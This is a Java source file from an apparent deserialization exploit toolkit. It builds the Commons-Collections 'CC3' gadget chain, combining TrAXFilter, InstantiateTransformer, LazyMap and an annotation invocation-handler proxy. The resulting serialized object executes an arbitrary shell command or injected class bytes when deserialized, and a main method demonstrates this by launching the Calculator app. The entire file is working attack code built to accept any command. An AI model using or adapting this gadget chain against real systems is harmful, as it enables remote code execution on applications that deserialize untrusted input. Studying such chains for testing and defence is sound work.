package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.jdk.GAnnotationInvocationHandler;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CC3 implements POC{
    public Object getPocObject(Object poc) throws Exception {

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { poc } )};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = ReflectUtils.createProxy(GAnnotationInvocationHandler.createMemoizedInvocationHandler(lazyMap), Map.class);

        final InvocationHandler handler = GAnnotationInvocationHandler.createMemoizedInvocationHandler(mapProxy);

        ReflectUtils.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }

    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(cmd));
    }

    @Override
    public Object getPocObject(byte[] clzBytes) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(clzBytes));
    }

    public static void main(String[] args) throws Exception{
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new CC3().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
